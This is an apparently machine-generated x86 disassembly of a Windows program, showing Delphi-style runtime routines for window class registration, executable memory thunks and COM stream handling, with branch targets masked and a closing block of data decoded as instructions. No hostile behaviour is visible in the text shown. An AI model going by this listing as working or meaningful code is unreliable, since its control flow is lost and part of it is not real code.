cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403234
xor eax eax
mov [ ebx + 0x10 ] eax
sub_4208cc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403430
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_420878
mov dl 0x1
mov eax ebx
call sub_420dec
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_420d9c
sub_420924
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_420dec
mov edx ebx
mov eax esi
call sub_4208a4
pop edi
pop esi
pop ebx
retn
sub_42095c
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_41a550
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_420924
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_4208a4
sub_4209b4
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_41a468
call sub_4209b4
inc edi
dec esi
jne r-xdata
sub_4209f0
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_41a604
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403234
xor eax eax
mov [ ebx + 0x14 ] eax
sub_420a14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4209f0
mov edx ebx
mov eax esi
call sub_4209f0
pop esi
pop ebx
retn
sub_420a30
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_420a14
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41a468
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_420a8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_420838
push ebx
push sub_420860
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_42084c
push ebx
push sub_42086c
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_420b84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_408110
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_420c1c
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
sub_420c1c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_41a468
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_408110
test al al
jne r-xdata
sub_420c6c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404414
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_408294
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
xor edx edx
mov eax ebx
call sub_420dec
mov edx esi
mov eax ebx
call sub_420cf8
mov dl 0x1
mov eax ebx
call sub_420dec
sub_420d0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41a468
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41a3f4
sub_420d48
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_41a4c4
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a358
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41a4e4
sub_420d9c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_420d38
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_420d0c
mov cl 0x1
mov edx ebx
call sub_420d9c
inc edi
dec ebp
jne r-xdata
sub_420dec
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4042a4
mov edx esp
mov eax esi
call sub_403508
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_420e34
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_420e5c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_420eb8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420f18
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_420f3c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_420f84
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
mov edx esi
call sub_4211b4
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_420fec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_4211b4
mov edx ebx
mov eax esi
call sub_4211a8
sub_421030
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_421074
push ebx
push esi
push edi
call sub_4035c0
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420760
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_420a14
jmp r-xdata
mov eax esi
call sub_41a550
mov edx eax
mov eax edi
call sub_4211b4
lea eax [ edi + 0x50 ]
call sub_40d524
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a8
sub_4210d4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_421100
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_42111c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_421138
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_41a468
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_4211b4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41a358
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41a468
cmp ebp eax
jne r-xdata
sub_4211f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_420a14
mov edx ebx
call sub_4207e4
sub_421220
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_421268
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403234
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4212a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_4212ef
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421308
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421357
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4213da
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_4213f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42143d
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41c530
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421458
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405aac
xor eax eax
push ebp
push sub_421645
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_42161e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_40279c
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42160d
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027bc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42164c
lea eax [ ebp + 0xc ]
call sub_405a38
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_421688
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_4216eb
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42171c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_41a82c
mov edi eax
xor eax eax
push ebp
push sub_421771
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421778
mov eax [ rw-data ]
call sub_41a890
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a468
call sub_403234
inc esi
dec ebx
jne r-xdata
sub_421790
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_4217b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_402998
mov edx sub_421790
lea eax [ esi + 0x5 ]
call sub_4217b0
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_4217b0
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_421874
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406e1c
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4217b8
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_421928
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_421850
sub_421950
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4219f4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4219fb
retn
mov eax [ rw-data ]
call sub_419c58
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_42171c
xor edx edx
xor eax eax
call sub_41d430
mov eax rw-data
call sub_40d524
call sub_406168
lea eax [ eax + 0xc ]
call sub_40d524
mov eax rw-data
call sub_40d524
mov eax rw-data
call sub_405a38
mov eax sub_421788
call sub_4058d4
mov eax rw-data
call sub_40d524
call sub_42002c
mov eax rw-data
call sub_40d524
mov eax rw-data
call sub_405a38
sub_421a00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421a89
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421a90
retn
call sub_41fff8
mov eax sub_421788
call sub_4058cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d264
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405a50
mov dl 0x1
mov eax [ r-xdata ]
call sub_419554
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a6d4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a6d4
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_421a94
push 0x74004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebp - 0x1 ] dh
add [ eax ] al
push 0x76004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi - 0x1 ] dh
add [ eax ] al
push 0x78004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx - 0x1 ] bh
add [ eax ] al
push 0x7a004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx - 0x1 ] bh
add [ eax ] al
push 0x7c004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebp - 0x1 ] bh
add [ eax ] al
push 0x7e004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi - 0x1 ] bh
add [ eax ] al
push 0x60004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx - 0x1 ] ah
add [ eax ] al
push 0x62004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx - 0x1 ] ah
add [ eax ] al
push 0x64004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebp - 0x1 ] ah
add [ eax ] al
push 0x66004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi - 0x1 ] ah
add [ eax ] al
push 0x68004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
